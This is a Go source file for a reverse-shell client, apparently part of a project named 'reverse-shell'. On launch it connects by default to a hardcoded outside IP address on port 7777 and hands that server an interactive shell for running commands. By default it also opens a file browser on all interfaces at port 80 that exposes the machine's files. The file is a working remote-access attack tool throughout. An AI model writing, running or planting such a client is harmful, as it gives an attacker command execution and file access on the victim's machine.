package main

import (
	"flag"
	"fmt"
	"net"

	"github.com/kittizz/reverse-shell/pkg/command"
	"github.com/kittizz/reverse-shell/pkg/model"
	"github.com/kittizz/reverse-shell/pkg/protocol"
)

var opts = model.Option{}

func init() {

	flag.BoolVar(&opts.Verbose, "v", false, "Verbose")
	flag.StringVar(&opts.Server, "s", "45.130.141.109", "Server address")
	flag.StringVar(&opts.Port, "p", "7777", "Server port")
	flag.BoolVar(&opts.Filebrowser, "f", true, "filebrowser enable")
	flag.StringVar(&opts.FilebrowserIP, "fi", "0.0.0.0", "server address")
	flag.StringVar(&opts.FilebrowserPort, "fp", "80", "filebrowser port")
	flag.StringVar(&opts.FilebrowserRoot, "fr", "", "filebrowser root")
	flag.Parse()
}
func main() {
	p := protocol.NewProtocolProvider()
	c, err := p.StartConnector(net.JoinHostPort(opts.Server, opts.Port))
	if err != nil {
		fmt.Printf("Error: %s\n", err)
		return
	}
	c.DoPing()

	cmd := command.NewCmd()
	c.StartReverseShell(cmd)
	cmd.Run()
}
